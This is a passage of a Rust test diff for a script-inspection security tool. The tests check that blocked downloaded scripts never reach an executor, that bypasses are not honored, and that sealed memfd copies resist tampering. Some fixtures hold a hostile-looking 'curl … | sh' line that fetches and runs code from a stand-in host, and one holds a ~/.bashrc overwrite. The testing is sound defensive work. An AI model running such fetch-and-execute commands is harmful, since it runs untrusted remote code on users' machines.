+        let called = Arc::new(AtomicBool::new(false));
+        let callback_called = Arc::clone(&called);
+        let options = RunOptions {
+            url: "not-a-url".to_string(),
+            no_exec: false,
+            interactive: true,
+            expected_sha256: None,
+            // Keep the original public callback arity and argument types. The
+            // value may still be constructed by downstream code, but live use
+            // must be rejected before URL parsing, prompting, or invocation.
+            exec_fn: Some(Box::new(move |_, _| {
+                callback_called.store(true, Ordering::Release);
+                Ok(0)
+            })),
+        };
+
+        let error = match run(options) {
+            Ok(_) => panic!("legacy live executor unexpectedly ran"),
+            Err(error) => error,
+        };
+        assert!(
+            error.contains("legacy path-based script executors"),
+            "{error}"
+        );
+        assert!(
+            !error.contains("invalid URL"),
+            "network parsing ran: {error}"
+        );
+        assert!(!called.load(Ordering::Acquire));
+    }
+
+    #[test]
+    fn no_exec_full_run_never_invokes_legacy_callback_or_executes_blocked_body() {
+        use std::ffi::OsString;
+        use std::io::{Read as _, Write as _};
+        use std::sync::atomic::{AtomicBool, Ordering};
+        use std::sync::Arc;
+
+        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
+        impl EnvRestore {
+            fn set(&mut self, name: &'static str, value: Option<impl AsRef<std::ffi::OsStr>>) {
+                self.0.push((name, std::env::var_os(name)));
+                unsafe {
+                    match value {
+                        Some(value) => std::env::set_var(name, value),
+                        None => std::env::remove_var(name),
+                    }
+                }
+            }
+        }
+        impl Drop for EnvRestore {
+            fn drop(&mut self) {
+                for (name, value) in self.0.drain(..).rev() {
+                    unsafe {
+                        match value {
+                            Some(value) => std::env::set_var(name, value),
+                            None => std::env::remove_var(name),
+                        }
+                    }
+                }
+            }
+        }
+
+        let _lock = crate::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|error| error.into_inner());
+        let isolated = tempfile::tempdir().unwrap();
+        let mut env = EnvRestore(Vec::new());
+        env.set("HOME", Some(isolated.path()));
+        env.set("XDG_CONFIG_HOME", Some(isolated.path().join("config")));
+        env.set("XDG_DATA_HOME", Some(isolated.path().join("data")));
+        env.set("XDG_STATE_HOME", Some(isolated.path().join("state")));
+        env.set("XDG_CACHE_HOME", Some(isolated.path().join("cache")));
+        env.set("TIRITH_POLICY_ROOT", Some(isolated.path()));
+        env.set("TIRITH_PRIVATE_FETCH_ALLOW", Some("127.0.0.1/32"));
+        env.set("NO_PROXY", Some("127.0.0.1,localhost"));
+        env.set("TIRITH_SERVER_URL", None::<&str>);
+        env.set("TIRITH_API_KEY", None::<&str>);
+        env.set("TIRITH_LOG", Some("0"));
+
+        let body: &'static [u8] =
+            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let address = listener.local_addr().unwrap();
+        let server = std::thread::spawn(move || {
+            let (mut stream, _) = listener.accept().unwrap();
+            let mut request = [0u8; 2048];
+            let _ = stream.read(&mut request);
+            write!(
+                stream,
+                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                body.len()
+            )
+            .unwrap();
+            stream.write_all(body).unwrap();
+        });
+        let called = Arc::new(AtomicBool::new(false));
+        let callback_called = Arc::clone(&called);
+        let result = run(RunOptions {
+            url: format!("http://{address}/inspect.sh"),
+            no_exec: true,
+            interactive: false,
+            expected_sha256: None,
+            exec_fn: Some(Box::new(move |_, _| {
+                callback_called.store(true, Ordering::Release);
+                panic!("--no-exec invoked legacy callback")
+            })),
+        })
+        .expect("analysis-only run completes");
+        server.join().unwrap();
+        assert!(!result.executed);
+        assert!(!result.refused, "--no-exec is analysis, not a live refusal");
+        assert!(!called.load(Ordering::Acquire));
+        assert_eq!(result.verdict.unwrap().action, Action::Block);
+    }
+
     #[cfg(target_os = "macos")]
     #[test]
     fn macos_forced_stdin_refuses_before_network_or_executor() {
@@ -1217,20 +1649,21 @@ mod tests {
             no_exec: false,
             interactive: true,
             expected_sha256: None,
-            requested_pipe_invocation: Some(RequestedPipeInvocation {
-                interpreter: PipeInterpreter::Sh,
-                args: Vec::new(),
-            }),
-            exec_fn: Some(Box::new(|_, _, _| {
-                panic!("macOS refusal must happen before interpreter execution")
-            })),
+            exec_fn: None,
         };
 
-        let error = match run(options) {
+        let error = match run_with_verified_pipe_executor(
+            options,
+            RequestedPipeInvocation {
+                interpreter: PipeInterpreter::Sh,
+                args: Vec::new(),
+            },
+            Box::new(|_, _| panic!("macOS refusal must happen before interpreter execution")),
+        ) {
             Ok(_) => panic!("macOS stdin execution must fail closed"),
             Err(error) => error,
         };
-        assert!(error.contains("setsid()"), "{error}");
+        assert!(error.contains("supported only on Linux"), "{error}");
         assert!(error.contains("before download"), "{error}");
         assert!(
             !error.contains("invalid URL"),
@@ -1281,7 +1714,8 @@ mod tests {
             &policy,
             true,
             true,
-            true
+            true,
+            true,
         ));
         assert_eq!(
             review.raw_verdict.as_ref().unwrap().findings.len(),
@@ -1295,6 +1729,57 @@ mod tests {
         let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
         assert_eq!(raw_action, "Block");
         assert_eq!(raw_rule_ids.len(), raw_count);
+    }
+
+    #[test]
+    fn bypass_is_not_honored_for_allow_or_analysis_only_verdicts() {
+        let dir = tempfile::tempdir().unwrap();
+        let policy = crate::policy::Policy {
+            allow_bypass_env: true,
+            allow_bypass_env_noninteractive: true,
+            ..crate::policy::Policy::default()
+        };
+
+        let mut clean = review_script_bytes(
+            b"#!/bin/sh\nprintf 'clean\\n'\n",
+            true,
+            false,
+            Some(dir.path()),
+            None,
+        )
+        .unwrap();
+        assert!(!apply_explicit_bypass(
+            &mut clean, &policy, true, true, true, true
+        ));
+        let clean_verdict = clean.effective_verdict.unwrap();
+        assert!(clean_verdict.bypass_requested);
+        assert!(clean_verdict.bypass_available);
+        assert!(!clean_verdict.bypass_honored);
+
+        let mut blocked = review_script_bytes(
+            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
+            false,
+            false,
+            Some(dir.path()),
+            None,
+        )
+        .unwrap();
+        assert_eq!(
+            blocked.effective_verdict.as_ref().unwrap().action,
+            Action::Block
+        );
+        assert!(!apply_explicit_bypass(
+            &mut blocked,
+            &policy,
+            true,
+            true,
+            true,
+            false,
+        ));
+        let blocked_verdict = blocked.effective_verdict.unwrap();
+        assert!(blocked_verdict.bypass_requested);
+        assert!(blocked_verdict.bypass_available);
+        assert!(!blocked_verdict.bypass_honored);
     }
 
     #[test]
@@ -1318,7 +1803,8 @@ mod tests {
             &policy,
             true,
             true,
-            false
+            false,
+            true,
         ));
         for verdict in [
             review.raw_verdict.as_ref().unwrap(),
@@ -1376,7 +1862,7 @@ mod tests {
         .unwrap();
         let mut env = EnvRestore(Vec::new());
         env.set("TIRITH", "0");
-        env.set("TIRITH_ALLOW_PRIVATE_FETCH", "1");
+        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
         env.set("TIRITH_POLICY_ROOT", isolated.path());
         env.set("HOME", isolated.path());
         env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
@@ -1421,20 +1907,23 @@ mod tests {
 
         let executor_called = Arc::new(AtomicBool::new(false));
         let called = Arc::clone(&executor_called);
-        let result = run(RunOptions {
-            url: format!("http://{address}/install.sh"),
-            no_exec: false,
-            interactive: true,
-            expected_sha256: Some(expected_sha256),
-            requested_pipe_invocation: Some(RequestedPipeInvocation {
+        let result = run_with_verified_pipe_executor(
+            RunOptions {
+                url: format!("http://{address}/install.sh"),
+                no_exec: false,
+                interactive: true,
+                expected_sha256: Some(expected_sha256),
+                exec_fn: None,
+            },
+            RequestedPipeInvocation {
                 interpreter: PipeInterpreter::Bash,
                 args: Vec::new(),
-            }),
-            exec_fn: Some(Box::new(move |_, _, _| {
+            },
+            Box::new(move |_, _| {
                 called.store(true, Ordering::Release);
                 panic!("blocked reviewed body reached the executor")
-            })),
-        })
+            }),
+        )
         .expect("blocked download returns a refusal receipt");
         stop.store(true, Ordering::Release);
         server.join().expect("join test server");
@@ -1450,36 +1939,176 @@ mod tests {
         assert_eq!(verdict.action, Action::Block);
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
-    fn exact_hash_clean_execution_uses_private_0600_file() {
-        use std::os::unix::fs::PermissionsExt;
+    fn pending_policy_approval_refuses_before_prompt_or_verified_executor() {
+        use std::ffi::OsString;
+        use std::io::{Read as _, Write as _};
+        use std::sync::atomic::{AtomicBool, Ordering};
+        use std::sync::Arc;
+        use std::time::{Duration, Instant};
+
+        struct PendingApprovalEnvRestore(Vec<(&'static str, Option<OsString>)>);
+        impl PendingApprovalEnvRestore {
+            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
+                if !self.0.iter().any(|(seen, _)| *seen == name) {
+                    self.0.push((name, std::env::var_os(name)));
+                }
+                // SAFETY: this test holds the crate-wide environment mutex.
+                unsafe { std::env::set_var(name, value) };
+            }
+        }
+        impl Drop for PendingApprovalEnvRestore {
+            fn drop(&mut self) {
+                for (name, value) in self.0.drain(..).rev() {
+                    // SAFETY: this guard is dropped while the environment mutex is held.
+                    unsafe {
+                        match value {
+                            Some(value) => std::env::set_var(name, value),
+                            None => std::env::remove_var(name),
+                        }
+                    }
+                }
+            }
+        }
+
+        let _env_lock = crate::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|error| error.into_inner());
+        let isolated = tempfile::tempdir().expect("isolated approval runner state");
+        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
+        std::fs::write(
+            isolated.path().join(".tirith/policy.yaml"),
+            "allow_bypass_env: true\n\
+             severity_overrides:\n\
+               dotfile_overwrite: INFO\n\
+             approval_rules:\n\
+               - rule_ids: [dotfile_overwrite]\n\
+                 timeout_secs: 30\n\
+                 fallback: block\n",
+        )
+        .unwrap();
+        let mut env = PendingApprovalEnvRestore(Vec::new());
+        env.set("TIRITH", "0");
+        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
+        env.set("TIRITH_POLICY_ROOT", isolated.path());
+        env.set("HOME", isolated.path());
+        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
+        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
+        env.set("XDG_STATE_HOME", isolated.path().join("state"));
+        env.set("NO_PROXY", "127.0.0.1,localhost");
+
+        let body: &'static [u8] = b"#!/bin/sh\necho reviewed > ~/.bashrc\n";
+        let expected_sha256 = sha256_hex(body);
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
+        listener.set_nonblocking(true).unwrap();
+        let address = listener.local_addr().unwrap();
+        let stop = Arc::new(AtomicBool::new(false));
+        let stop_server = Arc::clone(&stop);
+        let server = std::thread::spawn(move || {
+            let deadline = Instant::now() + Duration::from_secs(10);
+            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
+                match listener.accept() {
+                    Ok((mut stream, _)) => {
+                        stream
+                            .set_read_timeout(Some(Duration::from_secs(2)))
+                            .unwrap();
+                        let mut request = [0u8; 2048];
+                        let _ = stream.read(&mut request);
+                        write!(
+                            stream,
+                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                            body.len()
+                        )
+                        .unwrap();
+                        stream.write_all(body).unwrap();
+                        stream.flush().unwrap();
+                        return;
+                    }
+                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
+                        std::thread::sleep(Duration::from_millis(10));
+                    }
+                    Err(error) => panic!("test server accept failed: {error}"),
+                }
+            }
+        });
+
+        let executor_called = Arc::new(AtomicBool::new(false));
+        let called = Arc::clone(&executor_called);
+        let result = run_with_verified_executor(
+            RunOptions {
+                url: format!("http://{address}/approval.sh"),
+                no_exec: false,
+                interactive: true,
+                expected_sha256: Some(expected_sha256),
+                exec_fn: None,
+            },
+            Box::new(move |_, _| {
+                called.store(true, Ordering::Release);
+                panic!("pending approval reached the executor")
+            }),
+        )
+        .expect("pending approval returns a structured refusal");
+        stop.store(true, Ordering::Release);
+        server.join().expect("join approval test server");
+
+        assert!(result.refused);
+        assert!(!result.executed);
+        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
+        assert!(!executor_called.load(Ordering::Acquire));
+        let verdict = result.verdict.expect("pending approval verdict");
+        assert_eq!(verdict.action, Action::Allow);
+        assert_eq!(verdict.requires_approval, Some(true));
+        assert!(verdict.bypass_requested);
+        assert!(verdict.bypass_available);
+        assert!(!verdict.bypass_honored);
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn reviewed_script_memfd_is_fully_sealed_and_rejects_pwrite() {
+        use std::os::fd::AsRawFd as _;
+        use std::os::unix::fs::MetadataExt as _;
+        use std::os::unix::process::CommandExt as _;
 
         let dir = tempfile::tempdir().unwrap();
         let content = b"#!/bin/sh\nprintf 'clean\\n'\n";
         let sha = sha256_hex(content);
         let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
-        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
         assert_eq!(
-            std::fs::metadata(execution.path())
-                .unwrap()
-                .permissions()
-                .mode()
-                & 0o777,
-            0o600
+            execution.read_verified(content.len(), &sha).unwrap(),
+            content
+        );
+        let fd = execution.sealed_file.as_raw_fd();
+        let metadata = std::fs::metadata(format!("/proc/self/fd/{fd}")).unwrap();
+        assert_eq!(metadata.mode() & 0o777, 0o400);
+        let required =
+            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
+        assert_eq!(
+            unsafe { libc::fcntl(fd, libc::F_GET_SEALS) } & required,
+            required
+        );
+        let replacement = b'X';
+        assert_eq!(
+            unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
+            -1
         );
         assert_eq!(
-            std::fs::metadata(execution.path().parent().unwrap())
-                .unwrap()
-                .permissions()
-                .mode()
-                & 0o777,
-            0o700
+            std::io::Error::last_os_error().raw_os_error(),
+            Some(libc::EPERM)
         );
-        let output = Command::new("/bin/sh")
-            .arg(execution.path())
-            .output()
-            .expect("execute reviewed clean script");
+
+        let mut command = Command::new("/bin/sh");
+        command.arg(format!("/proc/self/fd/{fd}"));
+        unsafe {
+            command.pre_exec(move || {
+                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
+                    return Err(std::io::Error::last_os_error());
+                }
+                Ok(())
+            });
+        }
+        let output = command.output().expect("execute reviewed sealed script");
         assert!(output.status.success());
         assert_eq!(output.stdout, b"clean\n");
     }
@@ -1513,9 +2142,13 @@ mod tests {
         assert_eq!(std::fs::read(&cache_path).unwrap(), content);
     }
 
-    #[cfg(unix)]
+    #[cfg(target_os = "linux")]
     #[test]
     fn post_review_cache_swap_cannot_change_execution_bytes() {
+        use std::os::fd::AsRawFd as _;
+        use std::os::unix::process::CommandExt as _;
+        use std::sync::{Arc, Barrier};
+
         let dir = tempfile::tempdir().unwrap();
         let cache_dir = dir.path().join("cache");
         std::fs::create_dir(&cache_dir).unwrap();
@@ -1529,17 +2162,41 @@ mod tests {
         let review = review_script_bytes(content, true, false, Some(dir.path()), None)
             .expect("review clean script bytes");
         assert!(review.analysis_complete);
-        std::fs::remove_file(&cache_path).unwrap();
-        std::fs::write(&cache_path, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();
-
         let execution = materialize_execution_file(&cache_dir, content, &sha).unwrap();
-        assert_ne!(execution.path(), cache_path);
-        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
-        assert_eq!(sha256_hex(&std::fs::read(execution.path()).unwrap()), sha);
-        let output = Command::new("/bin/sh")
-            .arg(execution.path())
-            .output()
-            .expect("execute private reviewed copy");
+        let fd = execution.sealed_file.as_raw_fd();
+        let barrier = Arc::new(Barrier::new(2));
+        let attacker_barrier = Arc::clone(&barrier);
+        let attacker_cache = cache_path.clone();
+        let attacker = std::thread::spawn(move || {
+            attacker_barrier.wait();
+            std::fs::remove_file(&attacker_cache).unwrap();
+            std::fs::write(&attacker_cache, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();
+            let replacement = b'X';
+            assert_eq!(
+                unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
+                -1
+            );
+            attacker_barrier.wait();
+        });
+        barrier.wait();
+        barrier.wait();
+        attacker.join().unwrap();
+
+        assert_eq!(
+            execution.read_verified(content.len(), &sha).unwrap(),
+            content
+        );
+        let mut command = Command::new("/bin/sh");
+        command.arg(format!("/proc/self/fd/{fd}"));
+        unsafe {
+            command.pre_exec(move || {
+                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
+                    return Err(std::io::Error::last_os_error());
+                }
+                Ok(())
+            });
+        }
+        let output = command.output().expect("execute sealed reviewed copy");
         assert!(output.status.success());
         assert_eq!(output.stdout, b"reviewed\n");
     }
